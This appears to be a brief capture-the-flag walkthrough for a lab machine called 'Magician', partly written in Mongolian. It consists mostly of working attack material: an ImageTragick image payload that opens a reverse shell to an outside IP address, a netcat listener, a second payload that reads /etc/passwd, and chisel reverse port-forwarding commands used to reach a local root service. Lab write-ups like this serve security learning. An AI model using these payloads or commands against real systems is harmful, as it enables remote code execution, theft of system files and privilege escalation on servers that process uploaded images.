# Magician - Imagetragick RCE Upload / Chisel Port Forwarding

https://imagetragick.com/

## RCE

**Image.png and upload**

```txt
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.8.174.180/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

**Listening attack port**

```bash
nc -lvp 4444
```

## Local File Read

**file_read.mvg ,png, jpg**

```txt
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

## Privilege Escalation

ss -lnpt командаар 127.0.0.1:6666 буюу локал дээр сервис ажиллаж байв. Бидэнд ssh auth байхгүй учир chisel ашигласан.

**Attacker side:**

```bash
./chisel_1.10.1_linux_amd64 server -p 3333 --reverse
```

**Victim side:**

```bash
chisel client --fingerprint LwMKwzu9kypdiDEys80EX0BAoTyp+2QxY4WuuJyI9Xw= 10.21.199.232:3333 R:8888:127.0.0.1:6666
```

**Port Forwarding хийсний дараа root эрхээр файл унших боломжтой байна.**

[image]
